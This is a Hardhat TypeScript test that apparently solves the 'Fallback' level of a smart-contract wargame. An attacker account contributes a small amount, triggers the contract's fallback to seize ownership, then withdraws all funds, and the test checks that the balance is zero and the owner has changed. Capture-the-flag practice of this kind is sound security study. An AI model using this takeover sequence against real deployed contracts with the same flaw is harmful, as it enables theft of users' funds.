import { TransactionResponse } from "@ethersproject/providers"
import { SignerWithAddress } from "@nomiclabs/hardhat-ethers/signers"
import { expect } from "chai"
import { Contract } from "ethers"
// @ts-ignore
import { ethers } from "hardhat"

const CONTRACT_NAME = "Fallback"

describe(CONTRACT_NAME, () => {
    let owner: SignerWithAddress;
    let attacker: SignerWithAddress;
    let contract: Contract;
    let tx: TransactionResponse;

    beforeEach(async () => {
        [ owner, attacker ] = await ethers.getSigners()

        const factory = await ethers.getContractFactory(CONTRACT_NAME)
        contract = await factory.deploy()
        await contract.deployed()
    })

    it("Should be possible to get ownership and withdraw funds", async () => {
        tx = await contract.connect(attacker).contribute({ value: 1 })
        await tx.wait()

        tx = await attacker.sendTransaction({
            to: contract.address,
            value: 1
        })
        await tx.wait()

        tx = await contract.connect(attacker).withdraw()
        await tx.wait()

        expect(await ethers.provider.getBalance(contract.address)).to.eq(0)
        expect(await contract.owner()).to.eq(attacker.address)
    })
})


